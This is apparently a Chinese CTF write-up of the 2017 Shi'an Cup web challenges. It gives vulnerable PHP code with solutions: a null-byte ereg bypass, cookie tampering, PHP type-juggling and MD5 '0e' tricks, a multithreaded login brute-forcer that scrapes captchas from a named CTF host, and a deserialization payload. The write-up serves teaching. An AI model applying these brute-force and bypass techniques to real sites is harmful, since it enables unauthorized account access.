---
title: 2017世安杯writeUp 
date: 2017-10-12 14:07:34
tags:
---

十月八号的时候，喊了涛哥和旺旺来工作室一起打比赛，之前看到是实验吧合作伙伴，大概就猜到了会有很多原题（结果没想到都是原题）。虽然这次比赛水平极差，但是感觉给新人做还是能增加点自信的，所以就把原题都复现了一下，放在自己的小服务器上，爆破密码的就不放了，服务器撑不住撑不住。



## Web

### ctf入门题目

```
<?php
$flag = '*****';

if (isset ($_GET['password'])) {
    if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)
        echo '<p class="alert">You password must be alphanumeric</p>';
    else if (strpos ($_GET['password'], '--') !== FALSE)
        die($flag);
    else
        echo '<p class="alert">Invalid password</p>';
}
?>
```

看到这种题没得话说，就是截断，ereg遇到null会停止判断。上网搜一大把，所以payload：1111%00--

### 曲奇饼

任意文件读取，line是改变读取的行数，所以一行一行的读index.php

```
<?php
error_reporting(0);
$file=base64_decode(isset($_GET['file'])?$_GET['file']:""); 
$line=isset($_GET['line'])?intval($_GET['line']):0;
if($file=='') header("location:index.php?line=&file=a2V5LnR4dA=="); 
// 
$file_list = array( 
    '0' =>'key.txt', 
    '1' =>'index.php', 
    ); 
// 
if(isset($_COOKIE['key']) && $_COOKIE['key']=='li_lr_480'){ 
    $file_list[2]='thisis_flag.php'; 
} 
// 
if(in_array($file, $file_list)){ 
    $fa = file($file); 
    echo $fa[$line]; 
} 


?> 

```

思路为，如果$_COOKIE['key']的值为‘li_lr_480’就可以读到flag文件，所以在burpsuite中修改一下cookie值即可。

### 类型 

```
<!-- 类型 -->
<?php 
show_source(__FILE__); 
$a=0; 
$b=0; 
$c=0; 
$d=0; 

if (isset($_GET['x1'])) 
{ 
        $x1 = $_GET['x1']; 
        $x1=="1"?die("ha?"):NULL; 
        switch ($x1) 
        { 
        case 0: 
        case 1: 
                $a=1; 
                break; 
        } 
} 
"x22":[[1],0]}
$x2=(array)json_decode(@$_GET['x2']); 
if(is_array($x2)){ 
    is_numeric(@$x2["x21"])?die("ha?"):NULL; 
    if(@$x2["x21"]){ 
        ($x2["x21"]>2017)?$b=1:NULL; 
    } 
    if(is_array(@$x2["x22"])){ 
        if(count($x2["x22"])!==2 OR !is_array($x2["x22"][0])) die("ha?"); 
        $p = array_search("XIPU", $x2["x22"]); 
        $p===false?die("ha?"):NULL; 
        foreach($x2["x22"] as $key=>$val){ 
            $val==="XIPU"?die("ha?"):NULL; 
        } 
        $c=1; 
} 
} 
$x3 = $_GET['x3']; 
if ($x3 != '15562') { 
    if (strstr($x3, 'XIPU')) { 
        if (substr(md5($x3),8,16) == substr(md5('15562'),8,16)) { 
            $d=1; 
        } 
    } 
} 
if($a && $b && $c && $d){ 
    include "flag.php"; 
    echo $flag; 
} 
?>
```

这种题之前也做过了，网上类似的题也很多。

先观察x1,发现x1不能等于1，在下面的switch有个漏洞（语言基础，不用break引发的），如果x1=0或者字符串（弱类型比较）[php弱类型比较表](http://php.net/manual/zh/types.comparisons.php)
就可以让a=1
x2是需要提交json，并且其中的x21不能为数字但是要比2017大，这里涉及到了PHP弱类型的
一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型intval再比(intval是直到
遇上数字或正负符号才开始做转换，再遇到非数字或字符串结束时)。所以另其为2018a即可
绕过。x22需要为数组且长度为2，并且[0]也为数组，并且其中的的某个数值与’XIPU’相比相
等，所以另[1]为0即可，
​x3是个老生长谈的话题了，利用的是php 0e+数字的字符串弱等于都相等。脚本跑即可：

```
import hashlib

zctf = 'abcdefuz'
a = 'abcdefghijklmnopqrstuvwxyz0123456789'
for i in a:
    for j in a:
        for k in a:
            for l in a:
                for m in a:
                    for n in a:
                        for o in a:
                            b =  "XIPU" + i + k + j + l + m + n + o
                            md5 = hashlib.md5()
                            md5.update(b.encode('utf-8'))
                            xx =  md5.hexdigest()
                            xx = unicode(xx,'utf-8')
                            # print xx.isnumeric()
                            if xx[8:10] == '0e' and xx[10:25].isnumeric():
                            # if xx[0:2] == '0e' and xx[2:31].isnumeric():
                                print b
```

### 登录

源码提示密码是5位数

验证码无法绕过，但是是直接显示在源码的，那就写脚本取验证码再爆破吧，这里是涛哥写的脚本，因为多线程爬虫还没写过，速度会很慢，所以只能靠涛哥了：

```
    #coding:utf-8
import sys, requests, os, subprocess
from functions import *

header = { \
'User-Agent':'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36', \
'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}

url = 'http://ctf1.shiyanbar.com/shian-s/index.php'

pwds = open('5num.txt').read().split('\n')
#pwds = match(open('ing.txt').read(), 'got! ', 'session: PHPSESSID=')
#
def bc_sub(arg):
    passwd = arg.get('passwd', '00000')
    s = requests.session()
    
    req = s.get(url)

    code = match(req.content, '<input name="randcode" type="text"><br><br>', '<br><br>      <input type="submit" value=')[0]

    qstr = '?username=admin&password=' + passwd + '&randcode=' + code
    #print url + qstr
    req2 = s.get(url + qstr)
    if(req2.status_code != 200):
        bc_sub(arg)
        return
    if(req2.content.find("密码错误") == -1):
        if(req2.content.find("网站访问认证，点击链接后将跳转到访问页面") != -1):
            bc_sub(arg)
            return
        print 'got! ' + passwd + "session: " + req.headers['Set-Cookie']
        open('geted', 'w').write('got! ' + passwd + "session: " + req.headers['Set-Cookie'] + '\n' + req2.content)
        #print req2.content
        
args = []

for line in pwds:
    args.append({"passwd": line})
    
starthread(bc_sub, 100, args)
```

### admin

```
<?php

$user = $_GET["user"];
$file = $_GET["file"];
$pass = $_GET["pass"];
if(isset($user)&&(file_get_contents($user,'r')==="the user is admin")){
    echo "hello admin!<br>";
    include($file); //class.php
}else{
    echo "you are not admin ! ";
}

<?php

class Read{//f1a9.php
    public $file;
    public function __toString(){
        if(isset($this->file)){
            echo file_get_contents($this->file);    
        }
        return "__toString was called!";
    }
}

```

首先是尝试了直接get提交"the user is admin"发现不行，后面想到试试php://input，发现可以，然后有文件包含漏洞，用php伪协议读源码，发现是个反序列化漏洞，在本地构造payload

```
class Read{//f1a9.php
    public $file = "f1a9.php";
    public function __toString(){
        if(isset($this->file)){
            echo file_get_contents($this->file);    
        }
        return "__toString was called!";
    }
}

$Dfile = new Read();
echo serialize($Dfile);
```

最后令file=class.php就可以得到flag




